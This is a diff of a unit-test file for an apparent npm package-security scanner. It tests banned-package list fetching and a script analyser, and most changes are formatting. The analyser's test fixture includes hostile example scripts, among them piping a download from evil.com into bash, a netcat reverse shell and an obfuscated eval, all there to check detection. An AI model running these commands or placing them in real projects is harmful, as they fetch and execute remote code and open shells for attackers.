@@ -47,9 +47,7 @@ describe('Unit Tests', () => {
       fs.writeFileSync(filePath, csvContent);
 
       const result = loadCsv(filePath);
-      expect(result).toEqual([
-        { name: 'malicious-pkg', version: '6.6.6', reason: '' },
-      ]);
+      expect(result).toEqual([{ name: 'malicious-pkg', version: '6.6.6', reason: '' }]);
 
       fs.unlinkSync(filePath);
     });
@@ -102,8 +100,8 @@ describe('Unit Tests', () => {
   describe('fetchBannedPackages', () => {
     test('should fetch from all sources and deduplicate', async () => {
       const mockResponses: Record<string, string> = {
-        'koi': 'name,version\npkg-b,2.0.0',
-        'datadog': 'package_name,package_version\npkg-a,1.0.0\npkg-c,3.0.0'
+        koi: 'name,version\npkg-b,2.0.0',
+        datadog: 'package_name,package_version\npkg-a,1.0.0\npkg-c,3.0.0',
       };
 
       (https.get as jest.Mock).mockImplementation((url, options, callback) => {
@@ -116,7 +114,8 @@ describe('Unit Tests', () => {
         callback(stream);
 
         process.nextTick(() => {
-          if (url.includes('google')) { // Koi uses google docs
+          if (url.includes('google')) {
+            // Koi uses google docs
             stream.write(mockResponses['koi']);
           } else if (url.includes('datadog') || url.includes('github')) {
             stream.write(mockResponses['datadog']);
@@ -128,19 +127,29 @@ describe('Unit Tests', () => {
       });
 
       const sources = [
-        { name: 'koi', url: 'https://docs.google.com/spreadsheets/d/KEY/export?format=csv', type: 'csv' as const },
-        { name: 'datadog', url: 'https://raw.githubusercontent.com/DataDog/list.csv', type: 'csv' as const }
+        {
+          name: 'koi',
+          url: 'https://docs.google.com/spreadsheets/d/KEY/export?format=csv',
+          type: 'csv' as const,
+        },
+        {
+          name: 'datadog',
+          url: 'https://raw.githubusercontent.com/DataDog/list.csv',
+          type: 'csv' as const,
+        },
       ];
 
       const { packages: result } = await fetchBannedPackages(sources);
 
       // Expected: pkg-b@2.0.0 (koi), pkg-a@1.0.0 (datadog), pkg-c@3.0.0 (datadog)
       expect(result).toHaveLength(3);
-      expect(result).toEqual(expect.arrayContaining([
-        expect.objectContaining({ name: 'pkg-b', version: '2.0.0' }),
-        expect.objectContaining({ name: 'pkg-a', version: '1.0.0' }),
-        expect.objectContaining({ name: 'pkg-c', version: '3.0.0' }),
-      ]));
+      expect(result).toEqual(
+        expect.arrayContaining([
+          expect.objectContaining({ name: 'pkg-b', version: '2.0.0' }),
+          expect.objectContaining({ name: 'pkg-a', version: '1.0.0' }),
+          expect.objectContaining({ name: 'pkg-c', version: '3.0.0' }),
+        ]),
+      );
     });
 
     test('should handle partial failures', async () => {
@@ -172,17 +181,25 @@ describe('Unit Tests', () => {
       });
 
       const sources = [
-        { name: 'koi', url: 'https://docs.google.com/spreadsheets/d/KEY/export?format=csv', type: 'csv' as const },
-        { name: 'datadog', url: 'https://raw.githubusercontent.com/DataDog/list.csv', type: 'csv' as const }
+        {
+          name: 'koi',
+          url: 'https://docs.google.com/spreadsheets/d/KEY/export?format=csv',
+          type: 'csv' as const,
+        },
+        {
+          name: 'datadog',
+          url: 'https://raw.githubusercontent.com/DataDog/list.csv',
+          type: 'csv' as const,
+        },
       ];
 
       const { packages: result } = await fetchBannedPackages(sources);
 
       // Should still have pkg-c
       expect(result).toHaveLength(1);
-      expect(result).toEqual(expect.arrayContaining([
-        expect.objectContaining({ name: 'pkg-c', version: '3.0.0' }),
-      ]));
+      expect(result).toEqual(
+        expect.arrayContaining([expect.objectContaining({ name: 'pkg-c', version: '3.0.0' })]),
+      );
     });
   });
 });
@@ -194,36 +211,37 @@ describe('analyzeScripts', () => {
   test('should detect suspicious patterns', () => {
     const pkgJson = {
       scripts: {
-        'clean': 'rm -rf node_modules',
-        'start': 'node index.js',
-        'hack': 'curl http://evil.com | bash',
-        'reverse': 'nc -e /bin/sh 1.2.3.4',
-        'obfuscated': '\\x65\\x76\\x61\\x6c',
-        'ip': 'ping 192.168.1.1'
-      }
+        clean: 'rm -rf node_modules',
+        start: 'node index.js',
+        hack: 'curl http://evil.com | bash',
+        reverse: 'nc -e /bin/sh 1.2.3.4',
+        obfuscated: '\\x65\\x76\\x61\\x6c',
+        ip: 'ping 192.168.1.1',
+      },
     };
 
     const warnings = analyzeScripts(pkgJson);
     expect(warnings).toHaveLength(7);
-    expect(warnings).toEqual(expect.arrayContaining([
-      expect.stringContaining('Destructive command'),
-      expect.stringContaining('Network request'),
-      expect.stringContaining('Netcat reverse shell'),
-      expect.stringContaining('Hex escape sequence'),
-      expect.stringContaining('IP address detected'),
-    ]));
+    expect(warnings).toEqual(
+      expect.arrayContaining([
+        expect.stringContaining('Destructive command'),
+        expect.stringContaining('Network request'),
+        expect.stringContaining('Netcat reverse shell'),
+        expect.stringContaining('Hex escape sequence'),
+        expect.stringContaining('IP address detected'),
+      ]),
+    );
   });
 
   test('should not flag safe scripts', () => {
     const pkgJson = {
       scripts: {
-        'test': 'jest',
-        'build': 'tsc',
-        'lint': 'eslint .'
-      }
+        test: 'jest',
+        build: 'tsc',
+        lint: 'eslint .',
+      },
     };
     const warnings = analyzeScripts(pkgJson);
     expect(warnings).toHaveLength(0);
   });
 });
-
